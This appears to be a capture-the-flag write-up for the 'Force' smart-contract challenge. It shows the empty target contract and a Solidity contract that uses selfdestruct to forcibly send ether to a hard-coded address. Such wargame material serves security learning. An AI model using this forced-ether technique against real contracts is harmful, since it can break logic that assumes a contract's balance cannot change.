## Force 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


```

In this challenge the use of selfdestruct function will be used to forcefully send ether into this contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Send{
    address public Cat = 0x12621DBA05fdcdCa57642e16BC02944b990Ffb3F;
    function send() external payable {
        require(msg.value > 0);
        selfdestruct(payable(Cat));
    } 
}
```